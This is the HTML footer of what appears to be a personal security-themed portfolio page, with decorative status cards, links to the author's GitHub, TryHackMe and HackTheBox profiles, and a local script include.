    <footer class="py-16 text-center border-t border-slate-800 bg-transparent mt-24 relative overflow-hidden">
        <div class="max-w-7xl mx-auto px-6 grid grid-cols-2 md:grid-cols-4 gap-4 mb-12">
            <div class="diag-card text-left">
                <span class="diag-label">Access_Level</span>
                <span class="diag-value">OMNI_READ_ONLY</span>
            </div>
            <div class="diag-card text-left">
                <span class="diag-label">Encryption</span>
                <span class="diag-value">AES-256-GCM<span class="diag-blink">_</span></span>
            </div>
            <div class="diag-card text-left">
                <span class="diag-label">Signal_Strength</span>
                <span class="diag-value text-blue-400">PURE_DATA_STREAM</span>
            </div>
            <div class="diag-card text-left">
                <span class="diag-label">System_Status</span>
                <span class="diag-value">STABLE_HARDENED</span>
            </div>
        </div>

        <div class="flex justify-center gap-6 mb-8">
            <a href="https://github.com/kalialucard" target="_blank"
                class="text-slate-400 hover:text-white transition-colors text-2xl" aria-label="GitHub"><i
                    class="fa-brands fa-github"></i></a>
            <a href="https://tryhackme.com/p/kalialucard" target="_blank"
                class="text-slate-400 hover:text-red-500 transition-colors text-2xl" aria-label="TryHackMe"
                title="TryHackMe"><i class="fa-solid fa-fire"></i></a>
            <a href="https://app.hackthebox.com/profile/2503089" target="_blank"
                class="text-slate-400 hover:text-green-400 transition-colors text-2xl" aria-label="HackTheBox"
                title="HackTheBox"><i class="fa-solid fa-cube"></i></a>
        </div>
        <p class="font-mono text-[10px] text-slate-600 uppercase tracking-widest text-center">Powered by kalialucard</p>
    </footer>

    <script src="../js/main.js"></script>
</body>
</html>